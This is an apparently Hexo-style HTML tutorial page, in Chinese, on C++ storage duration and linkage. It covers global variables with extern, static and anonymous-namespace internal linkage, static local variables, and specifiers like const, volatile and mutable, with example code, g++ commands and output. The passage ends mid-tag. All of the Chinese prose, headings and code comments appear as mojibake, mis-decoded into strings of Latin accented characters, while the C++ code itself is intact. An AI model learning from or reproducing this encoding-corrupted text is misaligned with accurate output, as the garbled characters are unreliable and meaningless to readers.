href="#9-2-3-é™æ€æŒç»­å˜é‡" class="headerlink" title="9.2.3 é™æ€æŒç»­å˜é‡"></a>9.2.3 é™æ€æŒç»­å˜é‡</h3><p>é™æ€æŒç»­å˜é‡åœ¨ç¨‹åºæ•´ä¸ªè¿è¡ŒæœŸé—´éƒ½å­˜åœ¨ã€‚æ ¹æ®é“¾æ¥æ€§ä¸åŒï¼Œå®ƒä»¬æœ‰ä¸åŒçš„ç”¨é€”å’Œå¯è§æ€§ã€‚</p><h3 id="9-2-4-é™æ€æŒç»­æ€§ã€å¤–éƒ¨é“¾æ¥æ€§"><a href="#9-2-4-é™æ€æŒç»­æ€§ã€å¤–éƒ¨é“¾æ¥æ€§" class="headerlink" title="9.2.4 é™æ€æŒç»­æ€§ã€å¤–éƒ¨é“¾æ¥æ€§"></a>9.2.4 é™æ€æŒç»­æ€§ã€å¤–éƒ¨é“¾æ¥æ€§</h3><p>è¿™äº›å˜é‡ï¼ˆæœ‰æ—¶ç§°ä¸ºå…¨å±€å˜é‡ï¼‰å¯ä»¥åœ¨ç¨‹åºçš„å¤šä¸ªæ–‡ä»¶ä¸­å…±äº«ã€‚</p><ul><li>  <strong>å®šä¹‰:</strong> åœ¨æ‰€æœ‰å‡½æ•°å¤–éƒ¨å®šä¹‰ï¼Œä¸”æœªä½¿ç”¨ <code>static</code> å…³é”®å­—ã€‚</li><li>  <strong>å­˜å‚¨æŒç»­æ€§:</strong> é™æ€ã€‚</li><li>  <strong>ä½œç”¨åŸŸ:</strong> æ–‡ä»¶ä½œç”¨åŸŸï¼ˆä»å®šä¹‰ç‚¹åˆ°æ–‡ä»¶å°¾ï¼‰ã€‚</li><li>  <strong>é“¾æ¥æ€§:</strong> å¤–éƒ¨é“¾æ¥æ€§ã€‚</li><li>  <strong>åˆå§‹åŒ–:</strong> å¦‚æœæœªæ˜¾å¼åˆå§‹åŒ–ï¼Œä¼šè¢«è‡ªåŠ¨åˆå§‹åŒ–ä¸ºé›¶ï¼ˆæˆ–å¯¹åº”ç±»å‹çš„é›¶å€¼ï¼‰ã€‚</li><li>  <strong>å…±äº«:</strong> è¦åœ¨å…¶ä»–æ–‡ä»¶ä¸­ä½¿ç”¨ï¼Œéœ€è¦ä½¿ç”¨ <code>extern</code> å…³é”®å­—è¿›è¡Œ<strong>å£°æ˜</strong>ï¼ˆä¸æ˜¯å®šä¹‰ï¼‰ã€‚</li></ul><p><strong>ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// file1.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰å…·æœ‰å¤–éƒ¨é“¾æ¥æ€§çš„å…¨å±€å˜é‡</span></span><br><span class="line"><span class="keyword">double</span> global_data = <span class="number">3.14</span>; <span class="comment">// æ˜¾å¼åˆå§‹åŒ–</span></span><br><span class="line"><span class="keyword">int</span> count; <span class="comment">// éšå¼åˆå§‹åŒ–ä¸º 0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">increment_count</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display_data</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;In file1: global_data = &quot;</span> &lt;&lt; global_data &lt;&lt; <span class="string">&quot;, count = &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// file2.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å£°æ˜ file1 ä¸­å®šä¹‰çš„å…¨å±€å˜é‡ (ä½¿ç”¨ extern)</span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">double</span> global_data;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> count;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å£°æ˜ file1 ä¸­å®šä¹‰çš„å‡½æ•° (å‡½æ•°å£°æ˜é»˜è®¤ extern)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">increment_count</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display_data</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">use_globals</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;In file2 (before increment): global_data = &quot;</span> &lt;&lt; global_data &lt;&lt; <span class="string">&quot;, count = &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    increment_count(); <span class="comment">// è°ƒç”¨ file1 ä¸­çš„å‡½æ•°ï¼Œä¿®æ”¹ file1 ä¸­çš„ count</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;In file2 (after increment): global_data = &quot;</span> &lt;&lt; global_data &lt;&lt; <span class="string">&quot;, count = &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    display_data(); <span class="comment">// è°ƒç”¨ file1 çš„å‡½æ•°</span></span><br><span class="line">    use_globals();  <span class="comment">// è°ƒç”¨ file2 çš„å‡½æ•°</span></span><br><span class="line">    display_data(); <span class="comment">// å†æ¬¡è°ƒç”¨ file1 çš„å‡½æ•°ï¼ŒæŸ¥çœ‹ count çš„å˜åŒ–</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç¼–è¯‘å’Œé“¾æ¥:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g++ file1.cpp file2.cpp -o myprogram</span><br><span class="line">./myprogram</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡º:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In file1: global_data &#x3D; 3.14, count &#x3D; 0</span><br><span class="line">In file2 (before increment): global_data &#x3D; 3.14, count &#x3D; 0</span><br><span class="line">In file2 (after increment): global_data &#x3D; 3.14, count &#x3D; 1</span><br><span class="line">In file1: global_data &#x3D; 3.14, count &#x3D; 1</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„:</strong> è¿‡åº¦ä½¿ç”¨å…·æœ‰å¤–éƒ¨é“¾æ¥æ€§çš„å…¨å±€å˜é‡ä¼šå¢åŠ æ¨¡å—é—´çš„è€¦åˆåº¦ï¼Œä½¿ç¨‹åºéš¾ä»¥ç†è§£å’Œç»´æŠ¤ï¼Œåº”å°½é‡é¿å…ã€‚</p><h3 id="9-2-5-é™æ€æŒç»­æ€§ã€å†…éƒ¨é“¾æ¥æ€§"><a href="#9-2-5-é™æ€æŒç»­æ€§ã€å†…éƒ¨é“¾æ¥æ€§" class="headerlink" title="9.2.5 é™æ€æŒç»­æ€§ã€å†…éƒ¨é“¾æ¥æ€§"></a>9.2.5 é™æ€æŒç»­æ€§ã€å†…éƒ¨é“¾æ¥æ€§</h3><p>è¿™äº›å˜é‡å’Œå‡½æ•°çš„ä½œç”¨åŸŸé™åˆ¶åœ¨å•ä¸ªç¼–è¯‘å•å…ƒï¼ˆ<code>.cpp</code> æ–‡ä»¶ï¼‰å†…ï¼Œæœ‰åŠ©äºé¿å…ä¸åŒæ–‡ä»¶é—´çš„å‘½åå†²çªã€‚</p><ul><li>  <strong>å®šä¹‰:</strong> åœ¨æ‰€æœ‰å‡½æ•°å¤–éƒ¨å®šä¹‰ï¼Œå¹¶ä½¿ç”¨ <code>static</code> å…³é”®å­—ã€‚æˆ–è€…å®šä¹‰åœ¨åŒ¿åå‘½åç©ºé—´ä¸­ã€‚</li><li>  <strong>å­˜å‚¨æŒç»­æ€§:</strong> é™æ€ã€‚</li><li>  <strong>ä½œç”¨åŸŸ:</strong> æ–‡ä»¶ä½œç”¨åŸŸã€‚</li><li>  <strong>é“¾æ¥æ€§:</strong> å†…éƒ¨é“¾æ¥æ€§ã€‚</li><li>  <strong>åˆå§‹åŒ–:</strong> åŒå¤–éƒ¨é“¾æ¥æ€§å˜é‡ï¼Œé»˜è®¤ä¸ºé›¶å€¼ã€‚</li><li>  <strong>å…±äº«:</strong> ä¸èƒ½è¢«å…¶ä»–ç¼–è¯‘å•å…ƒé€šè¿‡ <code>extern</code> è®¿é—®ã€‚</li></ul><p><strong>ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// service.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å…·æœ‰å†…éƒ¨é“¾æ¥æ€§çš„é™æ€å…¨å±€å˜é‡</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> service_counter = <span class="number">0</span>; <span class="comment">// åªåœ¨ service.cpp å¯è§</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å…·æœ‰å†…éƒ¨é“¾æ¥æ€§çš„é™æ€å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">internal_helper</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Internal helper called.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">provide_service</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    internal_helper();</span><br><span class="line">    service_counter++;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Service provided. Counter: &quot;</span> &lt;&lt; service_counter &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å£°æ˜ service.cpp ä¸­çš„å‡½æ•° (å…·æœ‰å¤–éƒ¨é“¾æ¥æ€§)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">provide_service</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// extern int service_counter; // é”™è¯¯ï¼æ— æ³•è®¿é—®å†…éƒ¨é“¾æ¥æ€§çš„å˜é‡</span></span><br><span class="line"><span class="comment">// static void internal_helper(); // é”™è¯¯ï¼æ— æ³•è®¿é—®å†…éƒ¨é“¾æ¥æ€§çš„å‡½æ•°</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    provide_service();</span><br><span class="line">    provide_service();</span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; service_counter; // é”™è¯¯ï¼</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç¼–è¯‘å’Œé“¾æ¥:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g++ service.cpp main.cpp -o myapp</span><br><span class="line">./myapp</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡º:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Internal helper called.</span><br><span class="line">Service provided. Counter: 1</span><br><span class="line">Internal helper called.</span><br><span class="line">Service provided. Counter: 2</span><br></pre></td></tr></table></figure><p><strong>åŒ¿åå‘½åç©ºé—´ (Unnamed/Anonymous Namespace):</strong></p><p>C++ æä¾›åŒ¿åå‘½åç©ºé—´ä½œä¸º <code>static</code> ç”¨äºå†…éƒ¨é“¾æ¥æ€§çš„æ›´å¥½æ›¿ä»£æ–¹æ¡ˆã€‚åœ¨åŒ¿åå‘½åç©ºé—´ä¸­å£°æ˜çš„æ‰€æœ‰å†…å®¹éƒ½å…·æœ‰å†…éƒ¨é“¾æ¥æ€§ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// service_v2.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123; <span class="comment">// åŒ¿åå‘½åç©ºé—´</span></span><br><span class="line">    <span class="keyword">int</span> service_counter_v2 = <span class="number">0</span>; <span class="comment">// å†…éƒ¨é“¾æ¥æ€§</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">internal_helper_v2</span><span class="params">()</span> </span>&#123; <span class="comment">// å†…éƒ¨é“¾æ¥æ€§</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Internal helper v2 called.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="comment">// end anonymous namespace</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">provide_service_v2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    internal_helper_v2();</span><br><span class="line">    service_counter_v2++;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Service v2 provided. Counter: &quot;</span> &lt;&lt; service_counter_v2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-2-6-é™æ€å­˜å‚¨æŒç»­æ€§ã€æ— é“¾æ¥æ€§"><a href="#9-2-6-é™æ€å­˜å‚¨æŒç»­æ€§ã€æ— é“¾æ¥æ€§" class="headerlink" title="9.2.6 é™æ€å­˜å‚¨æŒç»­æ€§ã€æ— é“¾æ¥æ€§"></a>9.2.6 é™æ€å­˜å‚¨æŒç»­æ€§ã€æ— é“¾æ¥æ€§</h3><p>è¿™ç§å˜é‡åœ¨å‡½æ•°å†…éƒ¨å£°æ˜ï¼Œä½†ä½¿ç”¨ <code>static</code> å…³é”®å­—ã€‚</p><ul><li>  <strong>å®šä¹‰:</strong> åœ¨ä»£ç å—ï¼ˆé€šå¸¸æ˜¯å‡½æ•°ï¼‰å†…éƒ¨ï¼Œä½¿ç”¨ <code>static</code> å…³é”®å­—ã€‚</li><li>  <strong>å­˜å‚¨æŒç»­æ€§:</strong> é™æ€ã€‚å®ƒä»¬åœ¨ç¨‹åºå¯åŠ¨æ—¶æˆ–ç¬¬ä¸€æ¬¡æ‰§è¡Œåˆ°å…¶å®šä¹‰æ—¶åˆ›å»ºï¼Œå¹¶åœ¨æ•´ä¸ªç¨‹åºç”Ÿå‘½å‘¨æœŸå†…å­˜åœ¨ã€‚</li><li>  <strong>ä½œç”¨åŸŸ:</strong> å—ä½œç”¨åŸŸã€‚å®ƒä»¬åªèƒ½åœ¨å®šä¹‰å®ƒä»¬çš„ä»£ç å—å†…éƒ¨æŒ‰åç§°è®¿é—®ã€‚</li><li>  <strong>é“¾æ¥æ€§:</strong> æ— é“¾æ¥æ€§ã€‚</li><li>  <strong>åˆå§‹åŒ–:</strong> åªåœ¨ç¨‹åºæ‰§è¡Œç¬¬ä¸€æ¬¡åˆ°è¾¾å…¶å®šä¹‰æ—¶åˆå§‹åŒ–ä¸€æ¬¡ã€‚å¦‚æœæœªæ˜¾å¼åˆå§‹åŒ–ï¼Œé»˜è®¤ä¸ºé›¶å€¼ã€‚</li><li>  <strong>ç‰¹æ€§:</strong> å®ƒä»¬åœ¨å‡½æ•°è°ƒç”¨ä¹‹é—´ä¿æŒå…¶å€¼ã€‚</li></ul><p><strong>ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">record_call</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> call_count = <span class="number">0</span>; <span class="comment">// é™æ€å±€éƒ¨å˜é‡ï¼Œåªåˆå§‹åŒ–ä¸€æ¬¡</span></span><br><span class="line">    call_count++;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Function record_call has been called &quot;</span> &lt;&lt; call_count &lt;&lt; <span class="string">&quot; times.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    record_call();</span><br><span class="line">    record_call();</span><br><span class="line">    record_call();</span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; call_count; // é”™è¯¯ï¼call_count åœ¨ main ä¸­ä¸å¯è§</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡º:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Function record_call has been called 1 times.</span><br><span class="line">Function record_call has been called 2 times.</span><br><span class="line">Function record_call has been called 3 times.</span><br></pre></td></tr></table></figure><h3 id="9-2-7-è¯´æ˜ç¬¦å’Œé™å®šç¬¦"><a href="#9-2-7-è¯´æ˜ç¬¦å’Œé™å®šç¬¦" class="headerlink" title="9.2.7 è¯´æ˜ç¬¦å’Œé™å®šç¬¦"></a>9.2.7 è¯´æ˜ç¬¦å’Œé™å®šç¬¦</h3><p>C++ æä¾›äº†ä¸€äº›å…³é”®å­—æ¥ä¿®æ”¹å˜é‡æˆ–å‡½æ•°çš„å­˜å‚¨æŒç»­æ€§ã€é“¾æ¥æ€§æˆ–è¡Œä¸ºï¼š</p><ul><li><strong><code>static</code></strong>:<ul><li>  ç”¨äºæ–‡ä»¶ä½œç”¨åŸŸï¼šæŒ‡å®š<strong>å†…éƒ¨é“¾æ¥æ€§</strong>ã€‚</li><li>  ç”¨äºå—ä½œç”¨åŸŸï¼šæŒ‡å®š<strong>é™æ€å­˜å‚¨æŒç»­æ€§</strong>ï¼ˆå’Œæ— é“¾æ¥æ€§ï¼‰ã€‚</li><li>  ç”¨äºç±»æˆå‘˜ï¼šè¡¨ç¤ºæˆå‘˜å±äºç±»æœ¬èº«ï¼Œè€Œä¸æ˜¯ç±»çš„ç‰¹å®šå¯¹è±¡ï¼ˆå°†åœ¨ç±»ç« èŠ‚è¯¦ç»†ä»‹ç»ï¼‰ã€‚</li></ul></li><li><strong><code>extern</code></strong>:<ul><li>  ç”¨äºå˜é‡ï¼šå£°æ˜ä¸€ä¸ªåœ¨åˆ«å¤„ï¼ˆé€šå¸¸æ˜¯å¦ä¸€ä¸ªæ–‡ä»¶ï¼‰å®šä¹‰çš„å…·æœ‰<strong>å¤–éƒ¨é“¾æ¥æ€§</strong>çš„å˜é‡ã€‚å®ƒä¸åˆ›å»ºå˜é‡ï¼Œåªæ˜¯å‘Šè¯‰ç¼–è¯‘å™¨è¯¥å˜é‡å­˜åœ¨ã€‚</li><li>  <code>extern &quot;C&quot;</code>: æŒ‡å®š<strong>è¯­è¨€é“¾æ¥æ€§</strong>ï¼ˆè§ 9.2.9ï¼‰ã€‚</li></ul></li><li><strong><code>const</code></strong>:<ul><li>  é™å®šç¬¦ï¼Œè¡¨ç¤ºå˜é‡çš„å€¼ä¸èƒ½è¢«ä¿®æ”¹ã€‚</li><li><code>const</code> å…¨å±€å˜é‡é»˜è®¤å…·æœ‰<strong>å†…éƒ¨é“¾æ¥æ€§</strong>ã€‚è¦ä½¿å…¶å…·æœ‰å¤–éƒ¨é“¾æ¥æ€§ï¼Œå¿…é¡»ä½¿ç”¨ <code>extern const</code> å£°æ˜ï¼Œå¹¶åœ¨å®šä¹‰æ—¶ä¹ŸåŠ ä¸Š <code>extern</code>ã€‚  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// header.h</span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">const</span> <span class="keyword">int</span> MAX_USERS; <span class="comment">// å£°æ˜å¤–éƒ¨é“¾æ¥çš„ const</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// config.cpp</span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">const</span> <span class="keyword">int</span> MAX_USERS = <span class="number">100</span>; <span class="comment">// å®šä¹‰å¤–éƒ¨é“¾æ¥çš„ const</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// utils.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;header.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check_users</span><span class="params">()</span> </span>&#123; <span class="keyword">if</span> (user_count &gt; MAX_USERS) &#123; <span class="comment">/*...*/</span> &#125; &#125;</span><br></pre></td></tr></table></figure>  æˆ–è€…ï¼Œæ›´å¸¸è§çš„åšæ³•æ˜¯å°† <code>const</code> å®šä¹‰åœ¨å¤´æ–‡ä»¶ä¸­ï¼ˆå› ä¸ºå®ƒé»˜è®¤å†…éƒ¨é“¾æ¥ï¼Œä¸ä¼šå¼•èµ·é‡å®šä¹‰é—®é¢˜ï¼‰ï¼Œæˆ–è€…ä½¿ç”¨ C++11 çš„ <code>constexpr</code>ã€‚</li></ul></li><li><strong><code>thread_local</code> (C++11)</strong>:<ul><li>  æŒ‡å®š<strong>çº¿ç¨‹å­˜å‚¨æŒç»­æ€§</strong>ã€‚æ¯ä¸ªçº¿ç¨‹å°†æ‹¥æœ‰è¯¥å˜é‡çš„ç‹¬ç«‹å‰¯æœ¬ã€‚</li></ul></li><li><strong><code>volatile</code></strong>:<ul><li>  é™å®šç¬¦ï¼Œå‘Šè¯‰ç¼–è¯‘å™¨å˜é‡çš„å€¼å¯èƒ½åœ¨ç¨‹åºä»£ç æœªæ˜¾å¼ä¿®æ”¹çš„æƒ…å†µä¸‹å‘ç”Ÿæ”¹å˜ï¼ˆä¾‹å¦‚ï¼Œç”±ç¡¬ä»¶æˆ–å…¶ä»–å¹¶å‘çº¿ç¨‹ä¿®æ”¹ï¼‰ã€‚ç¼–è¯‘å™¨ä¸ä¼šå¯¹ <code>volatile</code> å˜é‡è¿›è¡ŒæŸäº›ä¼˜åŒ–ï¼ˆå¦‚ç¼“å­˜åˆ°å¯„å­˜å™¨ï¼‰ã€‚</li></ul></li><li><strong><code>mutable</code></strong>:<ul><li>  é™å®šç¬¦ï¼Œä»…ç”¨äºç±»çš„æ•°æ®æˆå‘˜ã€‚å…è®¸åœ¨ <code>const</code> æˆå‘˜å‡½æ•°ä¸­ä¿®æ”¹è¢« <code>mutable</code> ä¿®é¥°çš„æˆå‘˜å˜é‡ã€‚</li></ul></li></ul><h3 id="9-2-8-å‡½æ•°å’Œé“¾æ¥æ€§"><a href="#9-2-8-å‡½æ•°å’Œé“¾æ¥æ€§" class="headerlink" title="9.2.8 å‡½æ•°å’Œé“¾æ¥æ€§"></a>9.2.8 å‡½æ•°å’Œé“¾æ¥æ€§</h3><p>å‡½æ•°é»˜è®¤å…·æœ‰<strong>å¤–éƒ¨é“¾æ¥æ€§</strong>ï¼Œè¿™æ„å‘³ç€åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­å®šä¹‰çš„å‡½æ•°å¯ä»¥åœ¨å…¶ä»–æ–‡ä»¶ä¸­å£°æ˜å’Œè°ƒç”¨ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// math_utils.cpp</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">square</span><span class="params">(<span class="keyword">double</span> x)</span> </span>&#123; <span class="keyword">return</span> x * x; &#125; <span class="comment">// å¤–éƒ¨é“¾æ¥æ€§ (é»˜è®¤)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">square</span><span class="params">(<span class="keyword">double</span> x)</span></span>; <span class="comment">// å£°æ˜ (é»˜è®¤ extern)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; square(<span class="number">5.0</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨ <code>static</code> å…³é”®å­—å°†å‡½æ•°çš„é“¾æ¥æ€§æ”¹ä¸º<strong>å†…éƒ¨é“¾æ¥æ€§</strong>ï¼Œä½¿å…¶ä»…åœ¨å®šä¹‰çš„ <code>.cpp</code> æ–‡ä»¶å†…å¯è§ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// helper.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">internal_print</span><span class="params">(<span 